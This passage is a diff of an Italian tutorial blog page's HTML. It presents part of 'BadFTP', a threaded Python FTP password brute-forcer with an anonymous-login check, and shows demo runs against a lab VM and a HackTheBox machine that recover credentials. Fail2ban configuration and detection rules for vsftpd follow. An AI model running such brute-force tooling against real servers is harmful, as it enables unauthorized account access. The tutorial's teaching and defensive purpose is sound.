+</span></span><span style="display:flex;"><span>        print(Fore<span style="color:#f92672">.</span>RED <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">Usage: python3 script.py ftp_server_ip_address username wordlist_file</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    host <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
+</span></span><span style="display:flex;"><span>    wordlist_file <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    ftp_client <span style="color:#f92672">=</span> check_anonymous_ftp(host)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ftp_client:
+</span></span><span style="display:flex;"><span>        print(Fore<span style="color:#f92672">.</span>GREEN <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">The FTP server at </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">[ </span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> ]</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">allows anonymous access.&#39;</span>)
+</span></span><span style="display:flex;"><span>        list_ftp_directory(ftp_client) 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(Fore<span style="color:#f92672">.</span>RED <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">The FTP server at </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">[ </span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> ]</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">does not allow anonymous access or is unreachable.&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        passwords <span style="color:#f92672">=</span> open(wordlist_file)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Passwords to try: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>len(passwords)<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>        password_chunks <span style="color:#f92672">=</span> [passwords[i:i<span style="color:#f92672">+</span>chunk_size] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(passwords), chunk_size)]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        threads <span style="color:#f92672">=</span> []
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> chunk <span style="color:#f92672">in</span> password_chunks:
+</span></span><span style="display:flex;"><span>            thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>password_checker, args<span style="color:#f92672">=</span>(user, chunk,))
+</span></span><span style="display:flex;"><span>            thread<span style="color:#f92672">.</span>start()
+</span></span><span style="display:flex;"><span>            threads<span style="color:#f92672">.</span>append(thread)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> thread <span style="color:#f92672">in</span> threads:
+</span></span><span style="display:flex;"><span>            thread<span style="color:#f92672">.</span>join()
+</span></span></code></pre></div><p>Cosa differenzia BadFTP dallo script presente nel post che vi ho menzionato sopra? Proprio il fatto che BadFTP è <code>modulabile</code>. Lo script infatti verifica se il server FTP remoto è configurato in modo errato per poter permetter l&rsquo;accesso come anonymous, in caso positivo, elenca i file presenti sul server FTP, in caso negativo tenta di fare il brute forcing.</p>
 <p>Essendo che noi non sappiamo se il nostro server target sia a priori vulnerabile o meno, dobbiamo in ogni caso passargli le wordlist richieste, cosi facendo, se il server non permette l&rsquo;accesso come anonymous, BadFTP tenta il brute force.</p>
 <p>Vediamo lo script in opera, ho configurato una macchina Ubuntu con utente e password, analizziamo il comportamento di BadFTP:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/ftp-brute<span style="color:#f92672">]</span>
-└─$ python3 ftp-brute.py 
-                    
-     _____       _ _____ _____ _____ 
-    | __  |___ _| |   __|_   _|  _  |
-    | __ -| .<span style="color:#960050;background-color:#1e0010">&#39;</span>| . |   __| | | |   __|
-    |_____|__,|___|__|    |_| |__|   
-                                 
-        
-Usage: python3 script.py ftp_server_ip_address username wordlist_file
-</code></pre></div><p>Se non forniamo nessun parametro lo script ci informerà dei valori che necessita per funzionare correttamente:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/ftp-brute<span style="color:#f92672">]</span>
-└─$ python3 ftp-brute.py 192.168.1.77 paul wordlist.txt
-                    
-     _____       _ _____ _____ _____ 
-    | __  |___ _| |   __|_   _|  _  |
-    | __ -| .<span style="color:#960050;background-color:#1e0010">&#39;</span>| . |   __| | | |   __|
-    |_____|__,|___|__|    |_| |__|   
-                                 
-        
-
-The FTP server at <span style="color:#f92672">[</span> 192.168.1.77 <span style="color:#f92672">]</span> does not allow anonymous access or is unreachable.
-
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Passwords to try: <span style="color:#ae81ff">47</span>
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying dog
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying password
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying cat
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying beverly3cat
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying beverly3
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying cat
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying admin
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying cat
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying VTXrumVvszNh8y5z
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying admin
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying admin
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying wordpress
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying admin
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying dog339000
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying wordpress
-
-------------------------------
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found credentials: 
-        Host: 192.168.1.77
-        User: paul
-        Password: dog339000
-------------------------------
-</code></pre></div><p>Come vediamo, per far funzionare BadFTP, è necessario conoscere i nomi utenti presenti sul server FTP, infatti <em>il bruteforcing avviene solo sulla password dell&rsquo;utente specificato, in questo caso l&rsquo;utente <strong>paul</strong></em>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/ftp-brute<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 ftp-brute.py 
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>     _____       _ _____ _____ _____ 
+</span></span><span style="display:flex;"><span>    | __  |___ _| |   __|_   _|  _  |
+</span></span><span style="display:flex;"><span>    | __ -| .<span style="color:#960050;background-color:#1e0010">&#39;</span>| . |   __| | | |   __|
+</span></span><span style="display:flex;"><span>    |_____|__,|___|__|    |_| |__|   
+</span></span><span style="display:flex;"><span>                                 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>Usage: python3 script.py ftp_server_ip_address username wordlist_file
+</span></span></code></pre></div><p>Se non forniamo nessun parametro lo script ci informerà dei valori che necessita per funzionare correttamente:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/ftp-brute<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 ftp-brute.py 192.168.1.77 paul wordlist.txt
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>     _____       _ _____ _____ _____ 
+</span></span><span style="display:flex;"><span>    | __  |___ _| |   __|_   _|  _  |
+</span></span><span style="display:flex;"><span>    | __ -| .<span style="color:#960050;background-color:#1e0010">&#39;</span>| . |   __| | | |   __|
+</span></span><span style="display:flex;"><span>    |_____|__,|___|__|    |_| |__|   
+</span></span><span style="display:flex;"><span>                                 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The FTP server at <span style="color:#f92672">[</span> 192.168.1.77 <span style="color:#f92672">]</span> does not allow anonymous access or is unreachable.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Passwords to try: <span style="color:#ae81ff">47</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying dog
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying password
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying cat
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying beverly3cat
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying beverly3
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying cat
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying cat
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying VTXrumVvszNh8y5z
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying wordpress
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying admin
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying dog339000
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying wordpress
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found credentials: 
+</span></span><span style="display:flex;"><span>        Host: 192.168.1.77
+</span></span><span style="display:flex;"><span>        User: paul
+</span></span><span style="display:flex;"><span>        Password: dog339000
+</span></span><span style="display:flex;"><span>------------------------------
+</span></span></code></pre></div><p>Come vediamo, per far funzionare BadFTP, è necessario conoscere i nomi utenti presenti sul server FTP, infatti <em>il bruteforcing avviene solo sulla password dell&rsquo;utente specificato, in questo caso l&rsquo;utente <strong>paul</strong></em>.</p>
 <p>Come possiamo vedere, lo script ci ha trovato correttamente la password, che in questo caso è <code>dog339000</code>.</p>
 <p>Proviamo ora a usare lo script su una macchina che constente l&rsquo;accesso come anonymous, a tale fine, useremo la macchina <code>Crocodile</code> di HackTheBox, essa fa parte del percorso <strong>Starting Poing</strong>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/ftp-brute<span style="color:#f92672">]</span>
-└─$ python3 ftp-brute.py 10.129.224.108 paul wordlist.txt
-                    
-     _____       _ _____ _____ _____ 
-    | __  |___ _| |   __|_   _|  _  |
-    | __ -| .<span style="color:#960050;background-color:#1e0010">&#39;</span>| . |   __| | | |   __|
-    |_____|__,|___|__|    |_| |__|   
-                                 
-        
-
-The FTP server at <span style="color:#f92672">[</span> 10.129.224.108 <span style="color:#f92672">]</span> allows anonymous access.
-
-------------------------------
-
-Contents of the root directory:
-
-allowed.userlist
-allowed.userlist.passwd
-
-------------------------------
-</code></pre></div><p>In questo caso la macchina consente l&rsquo;accesso come anonymous, ed elenca i file presenti.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/ftp-brute<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ python3 ftp-brute.py 10.129.224.108 paul wordlist.txt
+</span></span><span style="display:flex;"><span>                    
+</span></span><span style="display:flex;"><span>     _____       _ _____ _____ _____ 
+</span></span><span style="display:flex;"><span>    | __  |___ _| |   __|_   _|  _  |
+</span></span><span style="display:flex;"><span>    | __ -| .<span style="color:#960050;background-color:#1e0010">&#39;</span>| . |   __| | | |   __|
+</span></span><span style="display:flex;"><span>    |_____|__,|___|__|    |_| |__|   
+</span></span><span style="display:flex;"><span>                                 
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The FTP server at <span style="color:#f92672">[</span> 10.129.224.108 <span style="color:#f92672">]</span> allows anonymous access.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Contents of the root directory:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>allowed.userlist
+</span></span><span style="display:flex;"><span>allowed.userlist.passwd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>------------------------------
+</span></span></code></pre></div><p>In questo caso la macchina consente l&rsquo;accesso come anonymous, ed elenca i file presenti.</p>
 <p>In entrambe le scansioni abbiamo usato una wordlist di test che ho creato personalmente, che è:</p>
 <p><strong>wordlist.txt:</strong></p>
 <pre tabindex="0"><code>dog
@@ -390,24 +410,24 @@ dog339000
 home
 google
 apple
-</code></pre><h1 id="introduzione-a-fail2ban">Introduzione a Fail2ban<a href="#introduzione-a-fail2ban" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+</code></pre><h2 id="introduzione-a-fail2ban">Introduzione a Fail2ban<a href="#introduzione-a-fail2ban" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Abbiamo abbondantemente visto come poter attaccare il protocollo FTP per trovare le credenziali, ma oltre ad attaccare un servizio è utile sapere anche come diferlo, ed ecco che viene in nostro aiuto fail2ban.</p>
-<h2 id="cosè-fail2ban">Cos&rsquo;è Fail2ban<a href="#cosè-fail2ban" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<h3 id="cosè-fail2ban">Cos&rsquo;è Fail2ban<a href="#cosè-fail2ban" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
 <p><code>Fail2ban</code> è un&rsquo;applicazione open source utilizzata per migliorare la sicurezza di un sistema Linux proteggendolo da attacchi di forza bruta e altri tipi di attacchi informatici. Il concetto di base di Fail2ban è monitorare i file di log del sistema per rilevare tentativi di accesso falliti e poi bloccare automaticamente gli indirizzi IP degli aggressori che effettuano tali tentativi ripetutamente. Questo aiuta a proteggere il tuo server da tentativi di accesso non autorizzati.</p>
 <p>Per installare <code>Fail2ban</code> usiamo il seguente comando per distro basate su Debian:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get install fail2ban
-</code></pre></div><p>Su una distribuzione basata su CentOS/RHEL, puoi usare:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo yum install fail2ban
-</code></pre></div><p>La configurazione di Fail2ban è basata su file di configurazione. Il file principale di configurazione di Fail2ban è solitamente <code>/etc/fail2ban/jail.conf</code> o <code>/etc/fail2ban/jail.local</code>. Tuttavia, è una buona pratica creare un file personalizzato chiamato <code>/etc/fail2ban/jail.d/custom.conf</code> per evitare di sovrascrivere le impostazioni predefinite.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo apt-get install fail2ban
+</span></span></code></pre></div><p>Su una distribuzione basata su CentOS/RHEL, puoi usare:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo yum install fail2ban
+</span></span></code></pre></div><p>La configurazione di Fail2ban è basata su file di configurazione. Il file principale di configurazione di Fail2ban è solitamente <code>/etc/fail2ban/jail.conf</code> o <code>/etc/fail2ban/jail.local</code>. Tuttavia, è una buona pratica creare un file personalizzato chiamato <code>/etc/fail2ban/jail.d/custom.conf</code> per evitare di sovrascrivere le impostazioni predefinite.</p>
 <p>Puoi creare un file <code>/etc/fail2ban/jail.d/vsftpd.conf</code> per configurare Fail2ban specificamente per vsftpd. Ecco un esempio di configurazione per il servizio vsftpd:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#f92672">[</span>vsftpd<span style="color:#f92672">]</span>
-enabled <span style="color:#f92672">=</span> true
-port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
-filter <span style="color:#f92672">=</span> vsftpd
-logpath <span style="color:#f92672">=</span> /var/log/vsftpd.log
-maxretry <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
-bantime <span style="color:#f92672">=</span> <span style="color:#ae81ff">3600</span>
-</code></pre></div><p>In questo esempio:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span><span style="color:#f92672">[</span>vsftpd<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>enabled <span style="color:#f92672">=</span> true
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>filter <span style="color:#f92672">=</span> vsftpd
+</span></span><span style="display:flex;"><span>logpath <span style="color:#f92672">=</span> /var/log/vsftpd.log
+</span></span><span style="display:flex;"><span>maxretry <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>bantime <span style="color:#f92672">=</span> <span style="color:#ae81ff">3600</span>
+</span></span></code></pre></div><p>In questo esempio:</p>
 <ul>
 <li>enabled = true abilita la regola per vsftpd.</li>
 <li>port = 21 specifica la porta utilizzata da vsftpd (21 è la porta FTP predefinita).</li>
@@ -417,90 +437,89 @@ bantime <span style="color:#f92672">=</span> <span style="color:#ae81ff">3600</s
 <li>bantime = 3600 specifica il tempo in cui l&rsquo;indirizzo IP viene bloccato in secondi (in questo caso, 3600 secondi, ovvero 1 ora).</li>
 </ul>
 <p>Il filtro predefinito per il protocollo FTP si trova nella path: <code>/etc/fail2ban/filter.d/vsftpd.conf</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Fail2Ban filter for vsftp</span>
-<span style="color:#75715e">#</span>
-<span style="color:#75715e"># Configure VSFTP for &#34;dual_log_enable=YES&#34;, and have fail2ban watch</span>
-<span style="color:#75715e"># /var/log/vsftpd.log instead of /var/log/secure. vsftpd.log file shows the</span>
-<span style="color:#75715e"># incoming ip address rather than domain names.</span>
-
-<span style="color:#f92672">[</span>INCLUDES<span style="color:#f92672">]</span>
-
-before <span style="color:#f92672">=</span> common.conf
-
-<span style="color:#f92672">[</span>Definition<span style="color:#f92672">]</span>
-
-__pam_re<span style="color:#f92672">=</span><span style="color:#ae81ff">\(</span>?%<span style="color:#f92672">(</span>__pam_auth<span style="color:#f92672">)</span>s<span style="color:#f92672">(</span>?:<span style="color:#ae81ff">\(\S</span>+<span style="color:#ae81ff">\)</span><span style="color:#f92672">)</span>?<span style="color:#ae81ff">\)</span>?:?
-_daemon <span style="color:#f92672">=</span>  vsftpd
-
-failregex <span style="color:#f92672">=</span> ^%<span style="color:#f92672">(</span>__prefix_line<span style="color:#f92672">)</span>s%<span style="color:#f92672">(</span>__pam_re<span style="color:#f92672">)</span>s<span style="color:#ae81ff">\s</span>+authentication failure; logname<span style="color:#f92672">=</span><span style="color:#ae81ff">\S</span>* uid<span style="color:#f92672">=</span><span style="color:#ae81ff">\S</span>* euid<span style="color:#f92672">=</span><span style="color:#ae81ff">\S</span>* tty<span style="color:#f92672">=(</span>ftp<span style="color:#f92672">)</span>? ruser<span style="color:#f92672">=</span><span style="color:#ae81ff">\S</span>* rhost<span style="color:#f92672">=</span>&lt;HOST&gt;<span style="color:#f92672">(</span>?:<span style="color:#ae81ff">\s</span>+user<span style="color:#f92672">=</span>.*<span style="color:#f92672">)</span>?<span style="color:#ae81ff">\s</span>*$
-            ^ <span style="color:#ae81ff">\[</span>pid <span style="color:#ae81ff">\d</span>+<span style="color:#ae81ff">\]</span> <span style="color:#ae81ff">\[</span><span style="color:#f92672">[</span>^<span style="color:#ae81ff">\]</span><span style="color:#f92672">]</span>+<span style="color:#ae81ff">\]</span> FAIL LOGIN: Client <span style="color:#e6db74">&#34;&lt;HOST&gt;&#34;</span><span style="color:#f92672">(</span>?:<span style="color:#ae81ff">\s</span>*$|,<span style="color:#f92672">)</span>
-
-ignoreregex <span style="color:#f92672">=</span> 
-
-<span style="color:#75715e"># Author: Cyril Jaquier</span>
-<span style="color:#75715e"># Documentation from fail2ban wiki</span>
-</code></pre></div><p>Dopo aver configurato Fail2ban e il filtro vsftpd, riavvia il servizio per applicare le modifiche:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo service fail2ban restart
-</code></pre></div><p>In alcuni casi può essere necessario anche avviare il servizio fail2ban, per farlo usiamo il comando:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo service fail2ban start
-</code></pre></div><p>Ora, proviamo ad eseguire di nuovo BadFTP e vediamo cosa accade:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>k0bra3390㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Desktop/ftp-brute<span style="color:#f92672">]</span>
-└─$ python3 ftp-brute.py 192.168.1.77 paul wordlist.txt 
-                    
-     _____       _ _____ _____ _____ 
-    | __  |___ _| |   __|_   _|  _  |
-    | __ -| .<span style="color:#960050;background-color:#1e0010">&#39;</span>| . |   __| | | |   __|
-    |_____|__,|___|__|    |_| |__|   
-                                 
-        
-
-The FTP server at <span style="color:#f92672">[</span> 192.168.1.77 <span style="color:#f92672">]</span> does not allow anonymous access or is unreachable.
-
-<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Passwords to try: <span style="color:#ae81ff">47</span>
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying dog
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying password
-<span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Trying catException in thread Thread-2 <span style="color:#f92672">(</span>password_checker<span style="color:#f92672">)</span>:
-Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/threading.py&#34;</span>, line 1038, in _bootstrap_inner
-    self.run<span style="color:#f92672">()</span>
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/threading.py&#34;</span>, line 975, in run
-    self._target<span style="color:#f92672">(</span>*self._args, **self._kwargs<span style="color:#f92672">)</span>
-  File <span style="color:#e6db74">&#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&#34;</span>, line 63, in password_checker
-    <span style="color:#66d9ef">if</span> is_correct<span style="color:#f92672">(</span>username, password<span style="color:#f92672">)</span>:
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File <span style="color:#e6db74">&#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&#34;</span>, line 36, in is_correct
-    server.connect<span style="color:#f92672">(</span>host, port, timeout<span style="color:#f92672">=</span>5<span style="color:#f92672">)</span>
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/ftplib.py&#34;</span>, line 158, in connect
-    self.sock <span style="color:#f92672">=</span> socket.create_connection<span style="color:#f92672">((</span>self.host, self.port<span style="color:#f92672">)</span>, self.timeout,
-                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/socket.py&#34;</span>, line 851, in create_connection
-    raise exceptions<span style="color:#f92672">[</span>0<span style="color:#f92672">]</span>
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/socket.py&#34;</span>, line 836, in create_connection
-    sock.connect<span style="color:#f92672">(</span>sa<span style="color:#f92672">)</span>
-ConnectionRefusedError: <span style="color:#f92672">[</span>Errno 111<span style="color:#f92672">]</span> Connection refused
-Exception in thread Thread-1 <span style="color:#f92672">(</span>password_checker<span style="color:#f92672">)</span>:
-Traceback <span style="color:#f92672">(</span>most recent call last<span style="color:#f92672">)</span>:
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/threading.py&#34;</span>, line 1038, in _bootstrap_inner
-    self.run<span style="color:#f92672">()</span>
-  File <span style="color:#e6db74">&#34;/usr/lib/python3.11/threading.py&#34;</span>, line 975, in run
-    self._target<span style="color:#f92672">(</span>*self._args, **self._kwargs<span style="color:#f92672">)</span>
-  File <span style="color:#e6db74">&#34;/home/k0bra3390/Desktop/ftp-brute/ftp-brute.py&#34;</span>, line 63, in password_checker
-    <span style="color:#66d9ef">if</span> is_correct<span style="color:#f92672">(</span>username, password<span style="color:#f92672">)</span>:
-       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
